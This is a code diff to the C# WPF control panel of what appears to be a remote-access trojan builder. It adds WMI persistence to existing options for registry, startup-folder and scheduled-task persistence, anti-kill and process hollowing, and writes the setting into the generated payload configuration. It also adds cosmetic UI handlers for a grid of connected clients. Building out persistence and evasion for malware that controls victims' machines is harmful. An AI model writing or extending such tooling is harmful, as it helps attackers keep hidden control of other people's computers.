@@ -1491,6 +1491,23 @@ public partial class ServerWindow : ThemedWindow
         if (row != null) { row.IsSelected = true; GridAllClients.Focus(); }
     }
 
+    private void GridAllClients_MouseRightButtonDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
+    {
+        var hit = VisualTreeHelper.HitTest(GridAllClients, e.GetPosition(GridAllClients));
+        var row = hit != null ? FindVisualAncestor<DataGridRow>(hit.VisualHit) : null;
+        if (row != null) { row.IsSelected = true; GridAllClients.Focus(); }
+    }
+
+    private void GridAllClients_ContextMenuOpening(object sender, ContextMenuEventArgs e)
+    {
+        if (GridAllClients.SelectedItems.Count == 0) e.Handled = true;
+    }
+
+    private void GridWinNotify_ContextMenuOpening(object sender, ContextMenuEventArgs e)
+    {
+        if (GridWinNotify.SelectedItem == null) e.Handled = true;
+    }
+
     private static T? FindVisualAncestor<T>(DependencyObject? source) where T : DependencyObject
     {
         var current = source;
@@ -2424,14 +2441,16 @@ public partial class ServerWindow : ThemedWindow
 
         bool anyPersist = BldPersistRegistry.IsChecked == true
                        || BldPersistStartup.IsChecked == true
-                       || BldPersistTask.IsChecked == true;
+                       || BldPersistTask.IsChecked == true
+                       || BldPersistWmi.IsChecked == true;
 
         BldInstallPanel.Visibility = anyPersist ? Visibility.Visible : Visibility.Collapsed;
 
         bool maxPersist = BldAntiKill.IsChecked == true
                        && BldPersistRegistry.IsChecked == true
                        && BldPersistStartup.IsChecked == true
-                       && BldPersistTask.IsChecked == true;
+                       && BldPersistTask.IsChecked == true
+                       && BldPersistWmi.IsChecked == true;
 
         if (TxtMaxPersist != null)
             TxtMaxPersist.Visibility = maxPersist ? Visibility.Visible : Visibility.Collapsed;
@@ -2548,6 +2567,7 @@ public partial class ServerWindow : ThemedWindow
         BldPersistRegistry.IsChecked = true;
         BldPersistStartup.IsChecked = true;
         BldPersistTask.IsChecked = true;
+        BldPersistWmi.IsChecked = true;
         BldHollowing.IsChecked = true;
     }
 
@@ -2599,6 +2619,7 @@ public partial class ServerWindow : ThemedWindow
             if (cfg.TryGetValue("PersistRegistry", out v)) BldPersistRegistry.IsChecked = v == "1";
             if (cfg.TryGetValue("PersistStartup", out v)) BldPersistStartup.IsChecked = v == "1";
             if (cfg.TryGetValue("PersistTask", out v)) BldPersistTask.IsChecked = v == "1";
+            if (cfg.TryGetValue("PersistWmi", out v)) BldPersistWmi.IsChecked = v == "1";
             if (cfg.TryGetValue("Hollowing", out v)) BldHollowing.IsChecked = v == "1";
             if (cfg.TryGetValue("HollowTarget", out var ht)) BldHollowTarget.Text = ht;
             if (cfg.TryGetValue("Encrypt", out v)) BldEncrypt.IsChecked = v == "1";
@@ -2692,6 +2713,7 @@ public partial class ServerWindow : ThemedWindow
                 ["PersistRegistry"] = BldPersistRegistry.IsChecked == true ? "1" : "0",
                 ["PersistStartup"] = BldPersistStartup.IsChecked == true ? "1" : "0",
                 ["PersistTask"] = BldPersistTask.IsChecked == true ? "1" : "0",
+                ["PersistWmi"] = BldPersistWmi.IsChecked == true ? "1" : "0",
                 ["Hollowing"] = BldHollowing.IsChecked == true ? "1" : "0",
                 ["HollowTarget"] = GetHollowTarget(),
                 ["Encrypt"] = BldEncrypt.IsChecked == true ? "1" : "0",
@@ -2843,6 +2865,7 @@ internal static class Config
     public const bool PersistRegistry = {(BldPersistRegistry.IsChecked == true ? "true" : "false")};
     public const bool PersistStartup = {(BldPersistStartup.IsChecked == true ? "true" : "false")};
     public const bool PersistTask = {(BldPersistTask.IsChecked == true ? "true" : "false")};
+    public const bool PersistWmi = {(BldPersistWmi.IsChecked == true ? "true" : "false")};
     public const string PersistName = ""{Esc(fileNameNoExt.ToLowerInvariant())}"";
 
     public const bool AntiKill = {(BldAntiKill.IsChecked == true ? "true" : "false")};
@@ -5696,6 +5719,29 @@ Read-Host 'Press Enter to close'
 
     private bool _navSyncing;
     private bool _langSyncing;
+
+    private void NavBtn_MouseMove(object sender, System.Windows.Input.MouseEventArgs e)
+    {
+        if (sender is not System.Windows.Controls.RadioButton btn) return;
+        if (btn.Template.FindName("SpotGlow", btn) is not Border glow) return;
+        if (glow.Background is not System.Windows.Media.RadialGradientBrush rgb) return;
+        if (rgb.IsFrozen) { rgb = rgb.Clone(); glow.Background = rgb; }
+        var pos = e.GetPosition(btn);
+        double cx = pos.X / Math.Max(btn.ActualWidth, 1);
+        double cy = pos.Y / Math.Max(btn.ActualHeight, 1);
+        rgb.GradientOrigin = new System.Windows.Point(cx, cy);
+        rgb.Center         = new System.Windows.Point(cx, cy);
+    }
+
+    private void NavBtn_MouseLeave(object sender, System.Windows.Input.MouseEventArgs e)
+    {
+        if (sender is not System.Windows.Controls.RadioButton btn) return;
+        if (btn.Template.FindName("SpotGlow", btn) is not Border glow) return;
+        if (glow.Background is not System.Windows.Media.RadialGradientBrush rgb) return;
+        if (rgb.IsFrozen) { rgb = rgb.Clone(); glow.Background = rgb; }
+        rgb.GradientOrigin = new System.Windows.Point(0.5, 0.5);
+        rgb.Center         = new System.Windows.Point(0.5, 0.5);
+    }
 
     private void Nav_Checked(object sender, RoutedEventArgs e)
     {
